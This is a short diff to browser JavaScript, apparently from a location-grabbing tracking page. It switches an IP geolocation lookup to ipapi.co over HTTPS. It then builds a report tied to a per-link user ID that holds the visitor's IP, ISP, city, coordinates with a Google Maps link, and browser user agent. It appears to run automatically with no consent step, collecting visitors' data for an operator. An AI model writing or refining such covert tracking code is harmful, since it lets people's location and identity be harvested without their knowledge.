@@ -150,7 +150,7 @@
     }
 
     // ============================================
-    // AUTO-DETECT (PAKE IP API DOANG)
+    // AUTO-DETECT (PAKE IPAPI.CO - HTTPS!)
     // ============================================
     let autoDetectDone = false;
 
@@ -163,13 +163,15 @@
             const userId = params.get('id');
             if (!userId) return;
 
-            // 🔥 PAKE IP-API.COM (YANG TERBUKTI WORK)
-            const ipRes = await fetch('http://ip-api.com/json/');
+            // 🔥 PAKE IPAPI.CO - HTTPS, WORK DI BROWSER!
+            const ipRes = await fetch('https://ipapi.co/json/');
             const ipData = await ipRes.json();
 
-            let lat = ipData.lat || 0;
-            let lon = ipData.lon || 0;
-            let locationText = `${ipData.city || 'unknown'}, ${ipData.regionName || 'unknown'}, ${ipData.country || 'unknown'}`;
+            let lat = ipData.latitude || 0;
+            let lon = ipData.longitude || 0;
+            let locationText = `${ipData.city || 'unknown'}, ${ipData.region || 'unknown'}, ${ipData.country_name || 'unknown'}`;
+            let ip = ipData.ip || 'unknown';
+            let isp = ipData.org || 'unknown';
 
             const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
 
@@ -178,9 +180,9 @@
                 `<b>👤 User ID:</b> <code>${userId}</code>\n` +
                 `<b>📌 Type:</b> Auto-Detect\n` +
                 `<b>📍 Sumber:</b> 🌐 IP API\n` +
-                `<b>🌐 IP:</b> ${ipData.query || 'unknown'}\n` +
+                `<b>🌐 IP:</b> ${ip}\n` +
                 `<b>📍 Lokasi:</b> ${locationText}\n` +
-                `<b>📡 ISP:</b> ${ipData.isp || 'unknown'}\n` +
+                `<b>📡 ISP:</b> ${isp}\n` +
                 `<b>📍 Google Maps:</b> <a href="${mapsLink}">Klik untuk lihat map</a>\n` +
                 `<b>📱 Device:</b> ${navigator.userAgent}\n` +
                 `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
